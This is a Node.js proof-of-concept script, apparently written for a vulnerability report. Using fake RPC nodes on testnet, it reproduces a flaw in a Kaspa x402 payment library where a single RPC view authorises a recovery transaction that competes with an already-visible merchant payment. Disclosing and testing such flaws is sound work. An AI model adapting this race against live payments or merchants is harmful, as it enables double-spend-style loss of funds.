#!/usr/bin/env node

import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import * as fs from "node:fs";
import * as os from "node:os";
import * as path from "node:path";
import { pathToFileURL } from "node:url";

const VULNERABLE_REVISION = "4ebb82d4f82bac46ae3addd112c4752f29630a8a";
const EXPECTED_SOURCE_HASHES = Object.freeze({
  "src/adapters/kaspa-x402/abandoned-staging-recovery.ts":
    "937213a65c090669378e80f0a73bea8fd0de5970f291de72965824f62af98ad1",
  "src/adapters/kaspa-x402/staging-recovery-rpc.ts":
    "97c854eacb470975b96c38eee1484bcb4121ab45f4731ec9cb71f7f36b2550d2",
});

const targetArgument = readTargetArgument(process.argv.slice(2));
const target = path.resolve(process.cwd(), targetArgument);
verifyTarget(target);

const [
  recoveryModule,
  rpcModule,
  stagingKeyModule,
  exactBuilderModule,
  identityModule,
  wasmModule,
] = await Promise.all([
  loadTargetModule(target, "dist/adapters/kaspa-x402/abandoned-staging-recovery.js"),
  loadTargetModule(target, "dist/adapters/kaspa-x402/staging-recovery-rpc.js"),
  loadTargetModule(target, "dist/adapters/kaspa-x402/staging-key-store.js"),
  loadTargetModule(target, "dist/adapters/kaspa-x402/exact-transaction-builder.js"),
  loadTargetModule(target, "dist/purchase/identity.js"),
  loadTargetModule(target, "dist/kaspa-wasm.js"),
]);

const {
  AbandonedStagingRecovery,
  decodeAbandonedStagingRecoveryEnvelope,
} = recoveryModule;
const {
  RpcStagingRecoveryRaceSource,
  RpcStagingRecoveryTransactionSubmitter,
} = rpcModule;
const { StagingKeyStore } = stagingKeyModule;
const { Kip10ExactTransactionBuilder } = exactBuilderModule;
const { assertPurchaseId, createPaymentIdentifier } = identityModule;
const { PrivateKey } = wasmModule;

const NOW = Date.parse("2030-01-01T00:00:00.000Z");
const STAGING_PRIVATE_KEY = "01".padStart(64, "0");
const RECOVERY_PRIVATE_KEY = "03".padStart(64, "0");
const PURCHASE_ID = assertPurchaseId("pur_AAAAAAAAAAAAAAAAAAAAAA");
const PAYMENT_IDENTIFIER = createPaymentIdentifier(PURCHASE_ID, 1);
const MERCHANT_ADDRESS =
  "kaspatest:qzlws9lm7uyt0tftzffshnyeu2zcqk4kf7hw5ghk6v0zh093vnkljcy2fl0fh";
const BORROW_REDEEM_SCRIPT =
  "632079be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798ac67b9bfb9c388b9c2048096980094b9bea268";
const BORROW_SCRIPT_PUBLIC_KEY =
  "0000aa20017f2ed51106a0b7d68477bbd1f1a65c000eecffc5e9f458501324810fb1944887";
const STAGING_TXID = "33".repeat(32);

const temporaryRoot = fs.mkdtempSync(path.join(os.tmpdir(), "sompi-single-rpc-poc-"));

try {
  const store = new StagingKeyStore({
    directory: path.join(temporaryRoot, "keys"),
    now: () => NOW,
    generatePrivateKey: () => STAGING_PRIVATE_KEY,
  });
  const key = store.create({
    purchaseId: PURCHASE_ID,
    paymentIdentifier: PAYMENT_IDENTIFIER,
  });
  const staging = Object.freeze({
    network: "kaspa:testnet-10",
    outpoint: { txid: STAGING_TXID, index: 1 },
    amountAtomic: "32000000",
    scriptPublicKey: key.scriptPublicKey,
    address: key.address,
    blockDaaScore: "123",
    keyReference: key.keyReference,
    evidenceDigest: digest("journal-verified-staging"),
  });

  const exactBuilder = new Kip10ExactTransactionBuilder({
    keyStore: store,
    now: () => NOW,
  });
  const exactBuilt = await exactBuilder.build({
    purchaseId: PURCHASE_ID,
    paymentIdentifier: PAYMENT_IDENTIFIER,
    request: {
      network: "kaspa:testnet-10",
      amount: "20000000",
      payTo: MERCHANT_ADDRESS,
      requestHash: "44".repeat(32),
      requiredFinality: "accepted",
      fundingSource: "vault-treasury",
      reservation: {
        templateId: "kaspa-x402-kip10-additive-v1",
        transactionEncoding: "kaspa-sdk-safe-json-v2.0.0",
        borrowOutpoint: { txid: "22".repeat(32), index: 0 },
        borrowAmount: "100000000",
        borrowScriptPublicKey: BORROW_SCRIPT_PUBLIC_KEY,
        borrowRedeemScript: BORROW_REDEEM_SCRIPT,
        additiveThresholdSompi: "10000000",
        paymentOutputIndex: 1,
        reservationId: "55".repeat(32),
        reservationExpiresAt: "2099-01-01T00:00:00.000Z",
      },
    },
    staging: {
      outpoint: staging.outpoint,
      amountAtomic: staging.amountAtomic,
      scriptPublicKey: staging.scriptPublicKey,
      address: staging.address,
      blockDaaScore: staging.blockDaaScore,
      keyReference: staging.keyReference,
    },
    additionalCostCeilingAtomic: "12050000",
    stagingTransactionFeeAtomic: "50000",
  });
  const exact = Object.freeze({
    transaction: exactBuilt.transaction,
    transactionEncoding: exactBuilt.transactionEncoding,
    transactionId: exactBuilt.transactionId,
    merchantOutputIndex: 1,
  });

  const mempoolLookups = [];
  const submittedTransactions = [];
  const selectedRpc = fakeRpc({
    entries: [
      utxoEntry(
        `${staging.outpoint.txid}:${staging.outpoint.index}`,
        staging.amountAtomic,
        staging.scriptPublicKey,
        staging.blockDaaScore,
      ),
    ],
    getMempoolEntry: async ({ transactionId }) => {
      mempoolLookups.push(transactionId);
      // This is a genuine transaction-not-found result for this node's view.
      // The issue does not depend on misclassifying an operational exception.
      throw new Error("transaction not found in mempool");
    },
    submitTransaction: async ({ transaction }) => {
      const transactionId = String(transaction.finalize()).toLowerCase();
      submittedTransactions.push(transactionId);
      return { transactionId };
    },
  });
  const selectedProvider = { client: async () => selectedRpc };
  const selectedSource = new RpcStagingRecoveryRaceSource({
    rpc: selectedProvider,
    now: () => NOW,
  });
  const submitter = new RpcStagingRecoveryTransactionSubmitter({
    rpc: selectedProvider,
    now: () => NOW,
  });
  const module = new AbandonedStagingRecovery({
    keyStore: store,
    recoveryAddress: addressForPrivateKey(PrivateKey, RECOVERY_PRIVATE_KEY),
    observer: selectedSource,
    submitter,
    now: () => NOW,
  });

  const prepared = await module.prepare({
    purchaseId: PURCHASE_ID,
    paymentIdentifier: PAYMENT_IDENTIFIER,
    staging,
    exactPayment: { mode: "exact_candidate", candidate: exact },
  });
  const envelope = decodeAbandonedStagingRecoveryEnvelope(prepared.preparedBytes);
  const request = raceRequest(envelope);

  // An independent view already sees the exact Merchant transaction. This
  // view is not consulted by the production single-source composition.
  const alternateRpc = fakeRpc({
    entries: [
      utxoEntry(
        envelope.exactPayment.outputOutpoint,
        envelope.exactPayment.outputAmountAtomic,
        envelope.exactPayment.outputScriptPublicKey,
        "900",
      ),
    ],
  });
  const alternateSource = new RpcStagingRecoveryRaceSource({
    rpc: { client: async () => alternateRpc },
    now: () => NOW,
  });
  const alternateEvidence = await alternateSource.observeRace(request);
  assert.equal(alternateEvidence.exactPayment.status, "observed");
  assert.equal(alternateEvidence.staging.status, "spent");

  const selectedEvidence = await selectedSource.observeRace(request);
  assert.equal(selectedEvidence.staging.status, "unspent");
  assert.equal(selectedEvidence.exactPayment.status, "absent");
  assert.equal(selectedEvidence.recovery.status, "absent");

  const observation = await module.observe(prepared.preparedBytes);
  assert.equal(observation.status, "safe_to_submit");
  if (observation.status !== "safe_to_submit") {
    throw new Error("vulnerable target did not mint readiness");
  }
  const submission = await module.submit(prepared.preparedBytes, observation.readiness);
  assert.equal(submission.status, "accepted");
  assert.equal(submittedTransactions.length, 1);
  assert.equal(submittedTransactions[0], envelope.recovery.transactionId);
  assert.ok(mempoolLookups.includes(envelope.exactPayment.transactionId));
  assert.ok(mempoolLookups.includes(envelope.recovery.transactionId));

  console.log(`[+] vulnerable revision: ${VULNERABLE_REVISION}`);
  console.log(
    `[+] alternate view: exact=${alternateEvidence.exactPayment.status}/${alternateEvidence.exactPayment.finality} staging=${alternateEvidence.staging.status}`,
  );
  console.log(
    `[+] selected RPC: exact=${selectedEvidence.exactPayment.status} recovery=${selectedEvidence.recovery.status} staging=${selectedEvidence.staging.status}`,
  );
  console.log(`[+] classifier result: ${observation.status}`);
  console.log(`[+] recovery submission calls: ${submittedTransactions.length}`);
  console.log("[+] reproduced: one selected RPC authorized the competing recovery submission");
} finally {
  fs.rmSync(temporaryRoot, { recursive: true, force: true });
}

function readTargetArgument(args) {
  const index = args.indexOf("--target");
  if (index === -1 || !args[index + 1] || args.length !== 2) {
    throw new Error("usage: node reproduce.mjs --target <relative-path-to-built-sompi>");
  }
  return args[index + 1];
}

function verifyTarget(targetRoot) {
  for (const [relativePath, expectedHash] of Object.entries(EXPECTED_SOURCE_HASHES)) {
    const sourcePath = path.join(targetRoot, relativePath);
    const actualHash = createHash("sha256").update(fs.readFileSync(sourcePath)).digest("hex");
    if (actualHash !== expectedHash) {
      throw new Error(
        `${relativePath} does not match vulnerable revision ${VULNERABLE_REVISION}`,
      );
    }
  }
  const requiredBuild = path.join(
    targetRoot,
    "dist/adapters/kaspa-x402/abandoned-staging-recovery.js",
  );
  if (!fs.existsSync(requiredBuild)) {
    throw new Error("target is not built; run npm ci and npm run build first");
  }
}

async function loadTargetModule(targetRoot, relativePath) {
  return import(pathToFileURL(path.join(targetRoot, relativePath)).href);
}

function raceRequest(envelope) {
  return {
    network: "kaspa:testnet-10",
    staging: {
      outpoint: envelope.staging.outpoint,
      address: envelope.staging.address,
      amountAtomic: envelope.staging.amountAtomic,
      scriptPublicKey: envelope.staging.scriptPublicKey,
      blockDaaScore: envelope.staging.blockDaaScore,
    },
    exactPayment: { ...envelope.exactPayment },
    recovery: {
      transactionId: envelope.recovery.transactionId,
      transactionArtifactDigest: envelope.recovery.transactionArtifactDigest,
      inputOutpoint: envelope.staging.outpoint,
      outputOutpoint: envelope.recovery.outputOutpoint,
      outputIndex: envelope.recovery.outputIndex,
      outputAddress: envelope.recovery.outputAddress,
      outputAmountAtomic: envelope.recovery.outputAmountAtomic,
      outputScriptPublicKey: envelope.recovery.outputScriptPublicKey,
    },
    deadlineAtMs: NOW + 1_000,
    signal: new AbortController().signal,
  };
}

function utxoEntry(outpoint, amountAtomic, scriptPublicKey, blockDaaScore) {
  const [transactionId, index] = outpoint.split(":");
  return {
    outpoint: { transactionId, index: Number(index) },
    amount: BigInt(amountAtomic),
    scriptPublicKey: { version: 0, script: scriptPublicKey.slice(4) },
    blockDaaScore: BigInt(blockDaaScore),
    isCoinbase: false,
  };
}

function fakeRpc({ entries, getMempoolEntry, submitTransaction } = {}) {
  return {
    getServerInfo: async () => ({
      isSynced: true,
      hasUtxoIndex: true,
      networkId: "testnet-10",
      virtualDaaScore: 1_000n,
    }),
    getUtxosByAddresses: async () => ({ entries: entries ?? [] }),
    getMempoolEntry:
      getMempoolEntry ??
      (async () => {
        throw new Error("transaction not found in mempool");
      }),
    submitTransaction:
      submitTransaction ??
      (async () => {
        throw new Error("submission disabled for this view");
      }),
  };
}

function addressForPrivateKey(PrivateKeyClass, privateKeyHex) {
  const privateKey = new PrivateKeyClass(privateKeyHex);
  const address = privateKey.toAddress("testnet-10");
  try {
    return address.toString();
  } finally {
    address.free();
    privateKey.free();
  }
}

function digest(value) {
  return `sha256:${createHash("sha256").update(value, "utf8").digest("base64url")}`;
}
